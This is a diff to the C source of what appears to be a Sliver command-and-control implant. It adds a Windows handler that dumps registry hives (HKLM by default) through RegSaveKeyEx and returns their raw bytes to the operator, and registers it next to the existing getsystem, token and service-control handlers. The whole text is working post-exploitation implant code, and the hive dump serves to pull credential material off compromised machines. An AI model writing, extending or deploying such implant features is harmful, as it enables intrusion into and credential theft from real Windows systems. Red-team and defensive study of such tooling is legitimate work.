@@ -1071,6 +1071,32 @@ static int handle_grep_v2(const sliver_envelope_t *req, sliver_buf_t *out) {
   }
 }
 
+
+/* --- registry read-hive (133) ------------------------------------------ */
+#if defined(_WIN32)
+static int handle_reg_read_hive(const sliver_envelope_t *req, sliver_buf_t *out) {
+  char root[64];
+  char requested[256];
+  uint8_t *data = NULL;
+  size_t len = 0;
+  int rc;
+
+  if (sliver_reg_hive_req_decode(req->data, req->data_len, root, sizeof(root), requested,
+                                 sizeof(requested)) != 0) {
+    return -1;
+  }
+  rc = sliver_reg_read_hive(root[0] != 0 ? root : "HKLM", requested, &data, &len);
+  if (rc != 0) {
+    return sliver_reg_hive_encode(out, NULL, 0, NULL,
+                                  "read-hive: RegSaveKeyEx failed (needs SeBackupPrivilege)");
+  }
+  rc = sliver_reg_hive_encode(out, data, len, "raw", NULL);
+  free(data);
+  LOG_DEBUG("rpc: read-hive %s -> %u bytes", root, (unsigned)len);
+  return rc;
+}
+#endif
+
 static const rpc_entry_t g_handlers[] = {
     {SLIVER_MSG_LS_REQ, SLIVER_MSG_LS, sliver_rpc_handle_ls},
     {SLIVER_MSG_PWD_REQ, SLIVER_MSG_PWD, sliver_rpc_handle_pwd},
@@ -1100,6 +1126,7 @@ static const rpc_entry_t g_handlers[] = {
 #if defined(_WIN32)
         {64, 65, handle_make_token},
     {32, 33, handle_getsystem},
+    {133, 133, handle_reg_read_hive},
     {130, 130, handle_services},
     {131, 131, handle_service_detail},
     {132, 132, handle_service_start},
@@ -1172,6 +1199,7 @@ void sliver_rpc_dispatch(const sliver_envelope_t *req, sliver_rpc_result_t *resu
     return;
   }
 }
+
 
 
 
